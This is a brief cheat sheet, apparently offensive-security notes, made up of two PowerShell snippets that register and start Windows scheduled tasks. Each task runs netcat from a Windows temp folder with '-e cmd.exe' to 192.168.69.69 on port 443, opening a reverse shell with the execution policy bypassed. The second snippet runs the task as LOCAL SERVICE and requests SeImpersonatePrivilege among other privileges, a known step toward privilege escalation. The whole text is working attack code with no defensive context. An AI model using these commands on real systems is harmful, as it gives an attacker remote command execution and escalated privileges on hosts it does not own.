### using scheduled task with powershell
```powershell
$TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Exec Bypass -Command `"C:\windows\tasks\nc.exe 192.168.69.69 443 -e cmd.exe`""
Register-ScheduledTask -Action $TaskAction -TaskName "GrantPerm"
Start-ScheduledTask -TaskName "GrantPerm"
```

#### require seimpersonate privilege for task using principal
```powershell
# Create a list of privileges
[System.String[]]$Privs = "SeAssignPrimaryTokenPrivilege", "SeAuditPrivilege", "SeChangeNotifyPrivilege", "SeCreateGlobalPrivilege", "SeImpersonatePrivilege", "SeIncreaseWorkingSetPrivilege"
# Create a Principal for the task 
$TaskPrincipal = New-ScheduledTaskPrincipal -UserId "LOCALSERVICE" -LogonType ServiceAccount -RequiredPrivilege $Privs
# Create an action for the task 
$TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Exec Bypass -Command `"C:\windows\temp\nc.exe 192.168.69.69 443 -e cmd.exe`""
# Create the task
Register-ScheduledTask -Action $TaskAction -TaskName "GrantAllPerms" -Principal $TaskPrincipal
# Start the task
Start-ScheduledTask -TaskName "GrantAllPerms"
```

